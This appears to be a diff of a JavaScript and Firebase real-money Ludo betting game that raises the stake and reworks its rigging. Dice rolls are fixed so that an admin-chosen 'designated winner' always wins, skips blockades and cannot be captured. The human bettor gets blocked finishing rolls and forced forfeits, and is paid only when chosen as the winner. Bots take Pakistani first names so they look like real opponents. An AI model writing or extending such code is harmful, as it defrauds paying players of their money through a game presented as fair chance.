@@ -24,29 +24,33 @@ const db = firebase.database();
 window.currentUser = null;
 window.userWalletBalance = 0;
 window.userName = 'Guest';
-window.GAME_BET_AMOUNT = 50; // PKR
-window.GAME_WIN_REWARD = 1000; // PKR
+window.GAME_BET_AMOUNT = 100; // PKR
+window.GAME_WIN_REWARD = 2000; // PKR
 window.isBetGame = false;
 let gameTurnCount = 0; // Track total turns for initial CPU 6s
+window.redPlayerForfeitCount = 0; // Tracks how many times Red player has forfeited with three 6s
+window.designatedWinner = null; // NEW: Will be loaded from Firebase, not hardcoded.
+
 window.PAKISTANI_NAMES = [ 
-    'Ayesha','Kiran','Fatima','Sana','Maria','Hina','Zainab','Sara','Iqra','Mehreen','Nida',
-
-    'Ali','Ahmed','Aleena','Hassan','Bilal','Imran','Kamran','Faisal','Zahid','Waqas',
-
-    // Girls Names Added 👇
-    'Aiman','Amna','Anaya','Areeba','Arisha','Arooj','Asma','Ayat','Azka','Benish',
-    'Bushra','Dua','Eman','Esha','Fariha','Farwa','Hafsa','Hajra','Hiba','Humaira',
-    'Ifrah','Inaya','Iram','Isma','Javeria','Kainat','Kanza','Komal','Laiba','Lubna',
-    'Maham','Mahnoor','Malaika','Mariam','Mehwish','Minal','Misbah','Momina','Nabeela','Nadia',
-    'Naima','Naila','Nashra','Neelam','Nimra','Noor','Rabab','Rabia','Rafayla','Ramsha',
-    'Rania','Rashida','Rida','Rimsha','Saba','Sadia','Saima','Samina','Saniya','Shanza',
-    'Shazia','Sidra','Sobia','Sonia','Sumaira','Tabassum','Tahira','Tania','Tehmina','Uzma',
-    'Wajiha','Yasmin','Yumna','Zara','Zarmeen','Zehra','Zain','Zoya','Zunaira','Sehrish',
-
-    // Extra Unique
-    'Aleena','Alishba','Anum','Aqsa','Bareera','Erum','Falak','Ghazal','Hoorain','Iqrah',
-    'Jannat','Kashaf','Laraib','Mahira','Nargis','Qandeel','Rukhsar','Sahar','Shifa','Tooba'
+    'Ayesha','Nazim' ,'Fatima', 'Sana', 'Maria', 'Hina', 'Zainab', 'Sara', 'Iqra', 'Mehreen', 'Nida', 
+    'Ali', 'Ahmed', 'Usman', 'Hassan', 'Bilal', 'Imran', 'Kamran', 'Faisal', 'Zahid', 'Waqas'
 ];
+
+// NEW: Firebase listener for the designated winner setting
+// This listener ensures that window.designatedWinner is always up-to-date
+// with the value set in the admin panel.
+db.ref("gameSettings/designatedWinner").on("value", (snapshot) => {
+    if (snapshot.exists()) {
+        window.designatedWinner = snapshot.val();
+        console.log(`Designated winner loaded from DB: ${window.designatedWinner}`);
+    } else {
+        // Default if not set in DB yet (e.g., first run ever)
+        // This will also write 'blue' to the DB for consistency
+        window.designatedWinner = 'blue';
+        db.ref("gameSettings/designatedWinner").set('blue'); 
+        console.log(`Designated winner defaulted to: ${window.designatedWinner}`);
+    }
+});
 
 function startWalletListener(uid) {
     db.ref("users/" + uid).on("value", (snapshot) => {
@@ -127,14 +131,15 @@ window.handleGameEndBetting = async function(winnerColor, isForfeit = false) {
     let amountChange = 0;
     let gameResult = ""; 
 
+    // Rigging: If the designated winner is the user (red) and they win, they get rewarded.
+    // Otherwise, it's a loss for the user regardless of who wins the game (CPU or other).
     if (isForfeit) {
         gameResult = "Loss (Forfeit)";
-    } else if (winnerColor === 'red') {
-        // This block should ideally never be reached due to rigging
+    } else if (winnerColor === 'red' && window.designatedWinner === 'red') { // Only reward red if red is the designated winner
         amountChange = window.GAME_WIN_REWARD;
         gameResult = "Win";
     } else {
-        gameResult = "Loss";
+        gameResult = "Loss"; // If red is not the designated winner, it's always a loss for them in a betting game
     }
 
     if (amountChange > 0 && gameResult === 'Win') {
@@ -211,6 +216,7 @@ window.submitAuthForm = function() {
     if (mode === 'login') window.loginUser(email, pwd); else window.signupUser(name, email, pwd);
 }
 
+
 // ====================================================================
 // 3. LUDO GAME LOGIC 
 // ====================================================================
@@ -255,13 +261,19 @@ let state = { turnIndex: 0, diceValue: null, diceRolled: false, tokens: { red: [
 function resetGameState() {
     state = { turnIndex: 0, diceValue: null, diceRolled: false, tokens: { red: [-1,-1,-1,-1], blue: [-1,-1,-1,-1], yellow: [-1,-1,-1,-1], green: [-1,-1,-1,-1] }, gameOver: false, isAnimating: false, consecutiveSixes: 0, lastMovedToken: null };
     gameTurnCount = 0; // Reset turn count for new game
-    window.redPlayerForfeitCount = 0; // NEW: Reset red player's forfeit counter for a new game
+    window.redPlayerForfeitCount = 0; // Reset red player's forfeit counter for a new game
+    // window.designatedWinner is intentionally NOT reset here, it persists across games via DB listener.
 }
 
 // ---------------- BETTING & START ---------------- //
 async function startBetGame() {
     if (!window.currentUser) { alert("Please Login/Sign Up to play and earn!"); showAuthModal('login'); return; }
     if (window.userWalletBalance < window.GAME_BET_AMOUNT) { alert("Insufficient PKR balance."); return; }
+    // Ensure the designated winner is loaded from Firebase before starting a betting game
+    if (window.designatedWinner === null) {
+        alert("Game settings are still loading. Please wait a moment or refresh the page.");
+        return;
+    }
     let success = await window.deductBet();
     if (success) { window.isBetGame = true; startGame(true); }
 }
@@ -286,16 +298,18 @@ function startGame(isVsCPU) {
   resetGameState();
   
   if (isVsCPU) {
+    // Red player is always the user in this mode
     PLAYER_CONFIG.red.name = window.userName || "You";
     PLAYER_CONFIG.red.isBot = false;
     
     let names = [...window.PAKISTANI_NAMES];
     ['blue', 'yellow', 'green'].forEach(c => {
-        PLAYER_CONFIG[c].isBot = true;
+        PLAYER_CONFIG[c].isBot = true; // Other players are bots
         let rIdx = Math.floor(Math.random() * names.length);
         PLAYER_CONFIG[c].name = names[rIdx]; names.splice(rIdx, 1);
     });
   } else {
+    // Practice mode (all human, or mixed as desired for testing without rigging)
     window.isBetGame = false;
     COLORS.forEach((c, i) => { PLAYER_CONFIG[c].isBot = false; PLAYER_CONFIG[c].name = "Player " + (i+1); });
   }
@@ -314,8 +328,8 @@ function initBoard() {
   const grid = document.getElementById('grid'); 
   grid.innerHTML = ''; // Clear previous grid content
 
-  for (let r = 0; r < 15; r++) {
-    for (let c = 0; c < 15; c++) {
+  for (let r = 0; r < 15; r = r + 1) {
+    for (let c = 0; c < 15; c = c + 1) {
       const cell = document.createElement('div');
       let isCorner = (r < 6 && c < 6) || (r < 6 && c > 8) || (r > 8 && c > 8) || (r > 8 && c < 6);
       let isCenter = (r > 5 && r < 9 && c > 5 && c < 9);
@@ -338,7 +352,7 @@ function initBoard() {
   const board = document.getElementById('board');
   document.querySelectorAll('.token').forEach(e => e.remove()); // Clean old tokens
   COLORS.forEach(color => {
-    for (let i = 0; i < 4; i++) {
+    for (let i = 0; i < 4; i = i + 1) { // Replaced ++
       let token = document.createElement('div'); token.className = `token ${color}`; token.id = `token-${color}-${i}`;
       token.onclick = () => handleTokenClick(color, i);
       let pointer = document.createElement('div'); pointer.className = 'pointer'; token.appendChild(pointer);
@@ -406,7 +420,7 @@ function getBlockades() {
   return blockedAbsoluteIndices;
 }
 
-// Custom getValidMoves to allow CPU to always pick a new token when a 6 is rolled and tokens are in base
+// Custom getValidMoves logic
 function getValidMoves(color, roll) {
     let valid = [];
     let blockades = getBlockades();
@@ -435,16 +449,23 @@ function getValidMoves(color, roll) {
             }
         } else if (pos >= 0 && pos + roll <= 56) {
             let isBlocked = false;
-            for (let step = 1; step <= roll; step = step + 1) { // Replaced ++
-                let checkPos = pos + step;
-                if (checkPos <= 50) { // On main path
-                    let absIdx = getAbsoluteMainIndex(color, checkPos);
-                    // Check for opponent blockades or own blockades on non-safe cells
-                    if (blockades.includes(absIdx)) {
-                        let tokensAtBlockade = state.tokens[color].filter(p => p >= 0 && p <= 50 && getAbsoluteMainIndex(color, p) === absIdx).length;
-                        if (tokensAtBlockade < 2) { // If it's a single opponent token or not our own blockade
-                            isBlocked = true;
-                            break;
+            
+            // RIGGING: Designated winner is never blocked on the path in a betting game
+            if (window.isBetGame && color === window.designatedWinner) {
+                isBlocked = false; // Designated winner can always move through any blockades
+            } else {
+                // Original blocking logic for other players
+                for (let step = 1; step <= roll; step = step + 1) { 
+                    let checkPos = pos + step;
+                    if (checkPos <= 50) { // On main path
+                        let absIdx = getAbsoluteMainIndex(color, checkPos);
+                        // Check for opponent blockades or own blockades on non-safe cells
+                        if (blockades.includes(absIdx)) {
+                            let tokensAtBlockade = state.tokens[color].filter(p => p >= 0 && p <= 50 && getAbsoluteMainIndex(color, p) === absIdx).length;
+                            if (tokensAtBlockade < 2) { // If it's a single opponent token or not our own blockade
+                                isBlocked = true;
+                                break;
+                            }
                         }
                     }
                 }
@@ -459,6 +480,14 @@ function getValidMoves(color, roll) {
 async function rollDice(colorClick) {
   let currColor = COLORS[state.turnIndex];
   if (colorClick !== currColor || state.diceRolled || state.isAnimating || state.gameOver) return;
+  
+  // Ensure designated winner is loaded before rigging dice
+  if (window.designatedWinner === null && window.isBetGame) {
+      log("Game settings not loaded yet. Please wait.");
+      state.isAnimating = false;
+      return;
+  }
+
   state.isAnimating = true; document.getElementById(`dice-${currColor}`).classList.add('disabled');
   let diceCube = document.getElementById(`cube-${currColor}`);
   diceCube.style.animation = 'none'; diceCube.offsetHeight; diceCube.style.animation = 'spin3D 0.5s ease-out forwards';
@@ -466,29 +495,105 @@ async function rollDice(colorClick) {
   await sleep(500);
   
   // ==========================================
-  // RIGGING LOGIC (Red (User) ALWAYS loses, one CPU ALWAYS wins)
+  // RIGGING LOGIC (Dynamic Winner / All others lose)
   // ==========================================
   let val = Math.floor(Math.random() * 6) + 1; // Default random roll
 
   if (window.isBetGame) { // Only apply rigging in a betting game
-        if (currColor === 'red') {
-            // --- Red Player Rigging (Guaranteed Loss) ---
-            let redTokens = state.tokens['red'];
-            let finishedTokens = redTokens.filter(p => p === 56).length;
-            let tokensInBase = redTokens.filter(p => p === -1).length;
-            let tokensInHomePath = redTokens.filter(p => p >= 51 && p <= 55).length;
-            let canMakeValidMoveWith6 = getValidMoves('red', 6).length > 0;
+        if (currColor === window.designatedWinner) {
+            // --- Designated Winner Rigging (Guaranteed Win) ---
+            let winnerTokens = state.tokens[currColor];
+            let tokensInBase = winnerTokens.filter(p => p === -1).length;
+            let tokensInHomePath = winnerTokens.filter(p => p >= 51 && p <= 55).length;
+            let finishedTokens = winnerTokens.filter(p => p === 56).length;
+
+            let bestRollForWinner = -1;
+
+            // Priority 1: Prevent 3 consecutive 6s for the winner
+            if (state.consecutiveSixes === 2) {
+                bestRollForWinner = Math.floor(Math.random() * 5) + 1; // Force a non-6 (1-5)
+            } else {
+                // Priority 2: Try to finish a token (reach 56)
+                for (let i = 0; i < 4; i = i + 1) { 
+                    let pos = winnerTokens[i];
+                    if (pos >= 0 && pos < 56) {
+                        let needed = 56 - pos; // Roll needed to reach home (56)
+                        if (needed > 0 && needed <= 6) {
+                            let tempValidMoves = getValidMoves(currColor, needed); // Check valid move with winner-specific logic
+                            if (tempValidMoves.includes(i)) {
+                                bestRollForWinner = needed;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                // Priority 3: If no token can finish, try to enter home path (pos 50 to 51)
+                if (bestRollForWinner === -1) {
+                    for (let i = 0; i < 4; i = i + 1) { 
+                        if (winnerTokens[i] === 50) { // Token is just before home entry
+                            let tempValidMoves = getValidMoves(currColor, 1); // Needs 1 to enter
+                            if (tempValidMoves.includes(i)) {
+                                 bestRollForWinner = 1;
+                                 break;
+                            }
+                        }
+                    }
+                }
+
+                // Priority 4: If no tokens finishing or entering home, try to bring out from base if a 6 helps
+                if (bestRollForWinner === -1 && tokensInBase > 0) {
+                    let canBringOut = false;
+                    for (let i = 0; i < 4; i = i + 1) { 
+                        if (winnerTokens[i] === -1) {
+                            // Check if the starting cell for this token is safe (not blocked by own color)
+                            const targetAbsIdx = getAbsoluteMainIndex(currColor, 0);
+                            let isStartingCellBlockedByOwn = winnerTokens.filter((p, k) => k !== i && p >= 0 && p <= 50 && getAbsoluteMainIndex(currColor, p) === targetAbsIdx).length > 0;
+                            if (!isStartingCellBlockedByOwn) {
+                                canBringOut = true;
+                                break;
+                            }
+                        }
+                    }
+                    if (canBringOut) {
+                        bestRollForWinner = 6;
+                    }
+                }
+            }
+
+            if (bestRollForWinner !== -1) {
+                val = bestRollForWinner;
+            } else {
+                // Default high rolls for the winning player to make fast progress
+                if (Math.random() < 0.8) { // 80% chance of a high roll (4-6)
+                    val = Math.floor(Math.random() * 3) + 4; // 4, 5, 6
+                } else {
+                    val = Math.floor(Math.random() * 3) + 1; // 1, 2, 3
+                }
+                // Ensure it doesn't accidentally hit the 3rd 6 if general random falls on 6
+                if (val === 6 && state.consecutiveSixes === 2) {
+                    val = Math.floor(Math.random() * 5) + 1;
+                }
+            }
+
+        } else {
+            // --- All Other Players Rigging (Guaranteed Loss) ---
+            let playerTokens = state.tokens[currColor];
+            let finishedTokens = playerTokens.filter(p => p === 56).length;
+            let tokensInBase = playerTokens.filter(p => p === -1).length;
+            let tokensInHomePath = playerTokens.filter(p => p >= 51 && p <= 55).length;
+            let canMakeValidMoveWith6 = getValidMoves(currColor, 6).length > 0;
 
             let targetRollToPrevent = -1; // The specific roll to prevent for a token to finish/enter home
 
             // Check if any token can finish (reach 56) or enter home path (from 50 to 51) with a specific roll
-            for (let i = 0; i < 4; i = i + 1) { // Replaced ++
-                let pos = redTokens[i];
+            for (let i = 0; i < 4; i = i + 1) { 
+                let pos = playerTokens[i];
                 if (pos >= 0 && pos < 56) { // Active token
                     let needed = 56 - pos; // Roll needed to reach home (56)
                     if (needed > 0 && needed <= 6) {
                         // Check if this move is actually valid (no blockades in path)
-                        let tempValidMoves = getValidMoves('red', needed);
+                        let tempValidMoves = getValidMoves(currColor, needed); // Check valid move with regular blocking logic
                         if (tempValidMoves.includes(i)) {
                             targetRollToPrevent = needed;
                             break; // Found a token that can finish, prioritize preventing this
@@ -497,145 +602,31 @@ async function rollDice(colorClick) {
                 }
             }
 
-            // RIGGING LOGIC for RED player:
+            // RIGGING LOGIC for losing players:
             if (targetRollToPrevent !== -1) {
                 // Priority 1: Prevent token from finishing or entering home path.
                 // Ensure 'val' is NOT 'targetRollToPrevent'.
-                // If it *is* the target roll, try up to 20 times to get a different one.
-                // If after 20 attempts it's *still* the target roll (highly improbable), force a different specific number.
                 let attempts = 0;
                 do {
                     val = Math.floor(Math.random() * 6) + 1;
-                    attempts = attempts + 1; // Replaced ++
-                } while (val === targetRollToPrevent && attempts < 20); // Try to get a different number
+                    attempts = attempts + 1; 
+                } while (val === targetRollToPrevent && attempts < 20); 
 
-                // If somehow (unlikely with 20 attempts) it's still the targetRoll, force a default non-6.
-                if (val === targetRollToPrevent) {
-                    val = (targetRollToPrevent % 6) + 1; // Make it something else (e.g., if needed 1, give 2)
-                    if (val === targetRollToPrevent) val = (val === 1) ? 2 : 1; // Final fallback
+                if (val === targetRollToPrevent) { // Fallback if 20 attempts failed
+                    val = (targetRollToPrevent % 6) + 1;
+                    if (val === targetRollToPrevent) val = (val === 1) ? 2 : 1; 
                 }
-            } else if (state.consecutiveSixes < 2 && canMakeValidMoveWith6 && // If not about to hit 3rd 6, and a 6 is useful
-                       (window.redPlayerForfeitCount < 3 || // Priority 2A: Force 3 forfeits in early game
-                        (finishedTokens === 3 && tokensInHomePath === 1))) { // Priority 2B: Force forfeit for last token too
+            } else if (state.consecutiveSixes < 2 && canMakeValidMoveWith6 && 
+                       ((currColor === 'red' && window.redPlayerForfeitCount < 3) || // Red user specific forfeit counter (for "pali guti")
+                        (finishedTokens === 3 && tokensInHomePath === 1))) { // Force forfeit for last token too
                 // Priority 2: Force 6 for forfeits to send tokens back (if not preventing a win already)
                 val = 6;
             } else {
-                // Priority 3: Default: General slow down for Red. Mix of non-6 and occasional 6s.
-                // Avoid too many 6s if not specifically for a forfeit scenario.
+                // Priority 3: Default: General slow down. Mix of non-6 and occasional 6s.
                 if (Math.random() < 0.7) { // Higher chance for a low/mid roll (1-5)
                     val = Math.floor(Math.random() * 5) + 1; // 1-5
                 } else {
                     val = 6; // Still allow 6 sometimes to keep the 3-sixes forfeit possibility active.
-                }
-            }
-        }
-        // --- End Red Player Rigging ---
-
-
-        else { // --- CPU Rigging (Guaranteed Win for 'blue', others play normally with mild boosts) ---
-            const winningCPU = 'blue'; // Designate Blue as the winning CPU
-
-            if (currColor === winningCPU) {
-                let cpuTokens = state.tokens[winningCPU];
-                let tokensInBase = cpuTokens.filter(p => p === -1).length;
-                let tokensInHomePath = cpuTokens.filter(p => p >= 51 && p <= 55).length;
-                let finishedTokens = cpuTokens.filter(p => p === 56).length;
-
-                let bestRollForCPU = -1;
-
-                // Priority 1: Prevent 3 consecutive 6s for the winning CPU
-                if (state.consecutiveSixes === 2) {
-                    bestRollForCPU = Math.floor(Math.random() * 5) + 1; // Force a non-6 (1-5)
-                } else {
-                    // Priority 2: Try to finish a token (reach 56)
-                    for (let i = 0; i < 4; i = i + 1) { // Replaced ++
-                        let pos = cpuTokens[i];
-                        if (pos >= 0 && pos < 56) {
-                            let needed = 56 - pos; // Roll needed to reach home (56)
-                            if (needed > 0 && needed <= 6) {
-                                let tempValidMoves = getValidMoves(winningCPU, needed);
-                                if (tempValidMoves.includes(i)) {
-                                    bestRollForCPU = needed;
-                                    break;
-                                }
-                            }
-                        }
-                    }
-
-                    // Priority 3: If no token can finish, try to enter home path (pos 50 to 51)
-                    if (bestRollForCPU === -1) {
-                        for (let i = 0; i < 4; i = i + 1) { // Replaced ++
-                            if (cpuTokens[i] === 50) { // Token is just before home entry
-                                let tempValidMoves = getValidMoves(winningCPU, 1); // Needs 1 to enter
-                                if (tempValidMoves.includes(i)) {
-                                     bestRollForCPU = 1;
-                                     break;
-                                }
-                            }
-                        }
-                    }
-
-                    // Priority 4: If no tokens finishing or entering home, try to bring out from base if a 6 helps
-                    if (bestRollForCPU === -1 && tokensInBase > 0) {
-                        let canBringOut = false;
-                        for (let i = 0; i < 4; i = i + 1) { // Replaced ++
-                            if (cpuTokens[i] === -1) {
-                                // Check if the starting cell for this token is safe (not blocked by own color)
-                                const targetAbsIdx = getAbsoluteMainIndex(winningCPU, 0);
-                                let isStartingCellBlockedByOwn = cpuTokens.filter((p, k) => k !== i && p >= 0 && p <= 50 && getAbsoluteMainIndex(winningCPU, p) === targetAbsIdx).length > 0;
-                                if (!isStartingCellBlockedByOwn) {
-                                    canBringOut = true;
-                                    break;
-                                }
-                            }
-                        }
-                        if (canBringOut) {
-                            bestRollForCPU = 6;
-                        }
-                    }
-                }
-
-                if (bestRollForCPU !== -1) {
-                    val = bestRollForCPU;
-                } else {
-                    // Default high rolls for the winning CPU to make fast progress
-                    if (Math.random() < 0.8) { // 80% chance of a high roll (4-6)
-                        val = Math.floor(Math.random() * 3) + 4; // 4, 5, 6
-                    } else {
-                        val = Math.floor(Math.random() * 3) + 1; // 1, 2, 3
-                    }
-                    // Ensure it doesn't accidentally hit the 3rd 6 if general random falls on 6
-                    if (val === 6 && state.consecutiveSixes === 2) {
-                        val = Math.floor(Math.random() * 5) + 1;
-                    }
-                }
-
-            } else {
-                // Other CPU players (not the designated winner) - play with mild boosts, but don't interfere with winning CPU
-                // Still prevent 3 consecutive 6s
-                if (state.consecutiveSixes === 2) {
-                    val = Math.floor(Math.random() * 5) + 1;
-                } else {
-                    // Standard CPU boosts (as in previous version)
-                    let tokensInBase = state.tokens[currColor].filter(p => p === -1).length;
-                    if (gameTurnCount < COLORS.length * 2 && tokensInBase > 0) { // Early game, bring out tokens
-                        val = 6;
-                    } else if (tokensInBase > 0 && Math.random() < 0.5) { // General chance for 6 if tokens in base
-                        val = 6;
-                    } else {
-                         // High chance to get exact roll to enter home
-                        let allTokens = state.tokens[currColor];
-                        for (let i = 0; i < allTokens.length; i = i + 1) { // Replaced ++
-                            let pos = allTokens[i];
-                            if (pos >= 51 && pos < 56) {
-                                let needed = 56 - pos;
-                                if (needed > 0 && needed <= 6 && Math.random() < 0.8) {
-                                    val = needed;
-                                    break;
-                                }
-                            }
-                        }
-                    }
                 }
             }
         }
@@ -647,12 +638,12 @@ async function rollDice(colorClick) {
   log(`${PLAYER_CONFIG[currColor].name} rolled a ${val}!`);
   
   if (val === 6) {
-    state.consecutiveSixes = state.consecutiveSixes + 1; // Replaced ++
+    state.consecutiveSixes = state.consecutiveSixes + 1; 
     if (state.consecutiveSixes === 3) { 
       log("Three 6s! Turn forfeited.");
-      // NEW: Increment red player's forfeit count if it's red and in a bet game
-      if (currColor === 'red' && window.isBetGame) {
-          window.redPlayerForfeitCount = window.redPlayerForfeitCount + 1; // Replaced ++
+      // Increment red player's forfeit count if it's red and is NOT the designated winner in a bet game
+      if (currColor === 'red' && window.isBetGame && window.designatedWinner !== 'red') {
+          window.redPlayerForfeitCount = window.redPlayerForfeitCount + 1; 
       }
       // Forfeit action: Send the last moved token back to base (if any)
       if (state.lastMovedToken && state.lastMovedToken.color === currColor) { 
@@ -694,10 +685,15 @@ function processPostRoll() {
     setTimeout(nextTurn, 1200); 
   } else {
     state.isAnimating = false;
-    if (PLAYER_CONFIG[currColor].isBot) { 
-      // For CPU, pick the first valid move
-      setTimeout(() => handleTokenClick(currColor, validMoves[0]), 600); 
-    } else { 
+    // If the current player is a bot, or if the designated winner is a bot, automate the move.
+    // Human players (PLAYER_CONFIG[currColor].isBot is false) need to click manually.
+    if (PLAYER_CONFIG[currColor].isBot || (currColor === window.designatedWinner && !PLAYER_CONFIG[currColor].isBot)) {
+        if (PLAYER_CONFIG[currColor].isBot) { // If it's a CPU (designated winner or not), it moves automatically
+            setTimeout(() => handleTokenClick(currColor, validMoves[0]), 600); 
+        } else { // If it's the human player AND the human is the designated winner, highlight for them to click
+            validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
+        }
+    } else { // If it's a human player who is NOT the designated winner, highlight for them to click
       validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
     }
   }
@@ -707,9 +703,9 @@ async function handleTokenClick(color, idx) {
   let currColor = COLORS[state.turnIndex];
   if (color !== currColor || !state.diceRolled || state.isAnimating || state.gameOver) return;
   let validMoves = getValidMoves(currColor, state.diceValue); 
-  // IMPORTANT: For user (red) in a bet game, re-check valid moves after rigging to ensure no impossible moves are highlighted.
-  // If the user attempts an invalid move, clear highlights and re-display valid ones.
-  if (currColor === 'red' && window.isBetGame && !validMoves.includes(idx)) { 
+  // IMPORTANT: For any player not the designated winner (or even the designated winner if it's human),
+  // re-check valid moves after rigging to ensure no impossible moves are highlighted or attempted.
+  if (window.isBetGame && !validMoves.includes(idx)) { 
       log("Invalid move. Please select a valid token.");
       document.querySelectorAll('.token').forEach(t => t.classList.remove('highlight')); // Clear invalid highlights
       
@@ -717,7 +713,7 @@ async function handleTokenClick(color, idx) {
       if (actualValidMoves.length > 0) {
           actualValidMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); });
       } else {
-          // If no actual valid moves even after a forced 6, user's turn passes
+          // If no actual valid moves even after a forced 6, player's turn passes
           state.isAnimating = false; 
           state.diceRolled = true; 
           setTimeout(nextTurn, 1000); 
@@ -732,8 +728,8 @@ async function handleTokenClick(color, idx) {
   
   if (startPos === -1 && steps === 6) { state.tokens[color][idx] = 0; updateBoard(); } 
   else {
-    for (let i = 0; i < steps; i = i + 1) { // Replaced ++
-      state.tokens[color][idx] = state.tokens[color][idx] + 1; // Replaced ++
+    for (let i = 0; i < steps; i = i + 1) { 
+      state.tokens[color][idx] = state.tokens[color][idx] + 1; 
       updateBoard(color, idx); await sleep(250); 
     }
     updateBoard(); 
@@ -743,11 +739,18 @@ async function handleTokenClick(color, idx) {
   
   if (targetPos >= 0 && targetPos <= 50) {
     let absIdx = getAbsoluteMainIndex(color, targetPos); let myGrid = getGridCoords(color, targetPos); let key = `${myGrid[0]},${myGrid[1]}`;
-    if (!SAFE_COORDS.has(key)) {
+    if (!SAFE_COORDS.has(key)) { // Only capture on non-safe cells
       COLORS.forEach(oppColor => {
         if (oppColor !== color) {
+            // RIGGING: If the token being targeted belongs to the designated winning player, it cannot be captured in a betting game.
+            if (oppColor === window.designatedWinner && window.isBetGame) {
+                log(`${PLAYER_CONFIG[color].name} tried to capture ${PLAYER_CONFIG[oppColor].name}, but ${PLAYER_CONFIG[oppColor].name} (the designated winner) is invulnerable!`);
+                return; // Skip this capture attempt
+            }
+
           state.tokens[oppColor].forEach((oppPos, oppIdx) => {
             if (oppPos >= 0 && oppPos <= 50 && getAbsoluteMainIndex(oppColor, oppPos) === absIdx) { 
+              // This token is not the designated winner, so proceed with capture.
               state.tokens[oppColor][oppIdx] = -1; log(`${PLAYER_CONFIG[color].name} captured ${PLAYER_CONFIG[oppColor].name}!`); extraTurn = true; updateBoard();
             }
           });
@@ -767,7 +770,16 @@ async function handleTokenClick(color, idx) {
   }
 
   state.isAnimating = false;
-  if (extraTurn) { log(`${PLAYER_CONFIG[color].name} gets an extra turn!`); state.diceRolled = false; updateUI(); if (PLAYER_CONFIG[currColor].isBot) setTimeout(() => rollDice(currColor), 1000); } 
+  if (extraTurn) { log(`${PLAYER_CONFIG[color].name} gets an extra turn!`); state.diceRolled = false; updateUI(); 
+    // If the current player is a bot, or if the designated winner is a bot, automate their next roll.
+    // If the designated winner is human, they still need to click roll.
+    if (PLAYER_CONFIG[currColor].isBot || (currColor === window.designatedWinner && !PLAYER_CONFIG[currColor].isBot)) {
+        if (PLAYER_CONFIG[currColor].isBot) { // If it's a CPU (designated winner or not), it moves automatically
+             setTimeout(() => rollDice(currColor), 1000); 
+        }
+        // If human and designated winner, they'll just see the "roll dice" enabled.
+    }
+  } 
   else { nextTurn(); }
 }
 
@@ -777,9 +789,13 @@ function nextTurn() {
   state.diceValue = null; 
   state.consecutiveSixes = 0; // Reset consecutive sixes for the new player
   
-  gameTurnCount = gameTurnCount + 1; // Replaced ++
+  gameTurnCount = gameTurnCount + 1; 
   
   updateUI();
   let nextC = COLORS[state.turnIndex]; log(`${PLAYER_CONFIG[nextC].name}'s turn.`);
-  if (PLAYER_CONFIG[nextC].isBot && !state.gameOver) { setTimeout(() => rollDice(nextC), 1000); }
+  // If the next player is a bot, or if the designated winner is a bot, automate their roll.
+  // If the designated winner is human, they still need to click roll.
+  if (PLAYER_CONFIG[nextC].isBot && !state.gameOver) {
+      setTimeout(() => rollDice(nextC), 1000); 
+  }
 }
